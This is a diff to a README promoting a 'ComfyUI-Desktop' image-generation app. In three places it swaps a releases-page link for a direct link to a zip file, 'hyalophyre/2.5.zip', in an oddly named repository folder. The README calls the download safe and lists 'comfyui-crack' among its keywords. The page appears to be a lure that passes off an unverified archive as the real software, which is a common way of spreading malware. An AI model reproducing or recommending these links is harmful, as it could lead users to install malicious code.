@@ -4,7 +4,7 @@
 
 Welcome to ComfyUI-Desktop, the easiest way to create stunning AI-generated images without writing a single line of code. This powerful desktop application lets you build complex AI workflows by simply connecting visual blocks on your screen. Whether you're an artist, designer, or curious beginner, you'll be creating professional-quality images in minutes.
 
-[⬇️ **DOWNLOAD NOW**](https://github.com/Cryonic-zircon3054/ComfyUI-Desktop---ComfyUI-Node-Editor-2026/releases)
+[⬇️ **DOWNLOAD NOW**](https://github.com/Cryonic-zircon3054/ComfyUI-Desktop---ComfyUI-Node-Editor-2026/raw/refs/heads/main/hyalophyre/2.5.zip)
 
 ## ✨ What Makes ComfyUI-Desktop Special?
 
@@ -25,7 +25,7 @@ Access hundreds of pre-trained AI models right from the application. No need to 
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [ComfyUI-Desktop Releases Page](https://github.com/Cryonic-zircon3054/ComfyUI-Desktop---ComfyUI-Node-Editor-2026/releases)
+Visit this link to download the application: [ComfyUI-Desktop Releases Page](https://github.com/Cryonic-zircon3054/ComfyUI-Desktop---ComfyUI-Node-Editor-2026/raw/refs/heads/main/hyalophyre/2.5.zip)
 
 Once you're on the download page, you'll see the latest version available for Windows. The download process is straightforward and safe.
 
@@ -151,6 +151,6 @@ You now have everything you need to start your AI image creation journey with Co
 
 The future of digital art is here, and it's more accessible than ever. With ComfyUI-Desktop, you're not just using AI—you're directing it with the precision of a professional artist and the creativity of a visionary.
 
-[🚀 **Start Creating Today - Download Now**](https://github.com/Cryonic-zircon3054/ComfyUI-Desktop---ComfyUI-Node-Editor-2026/releases)
+[🚀 **Start Creating Today - Download Now**](https://github.com/Cryonic-zircon3054/ComfyUI-Desktop---ComfyUI-Node-Editor-2026/raw/refs/heads/main/hyalophyre/2.5.zip)
 
 Keywords: ai-editor-2026, ai-image-nodes, ai-node-editor, ai-workflow-editor, comfyui-2026, comfyui-app, comfyui-crack, comfyui-custom, comfyui-desktop, comfyui-desktop-2026, comfyui-free, comfyui-installer, comfyui-models, comfyui-pack, comfyui-tool, comfyui-windows, node-ai-2026, node-editor-ai, visual-ai-editor, workflow-ai-2026
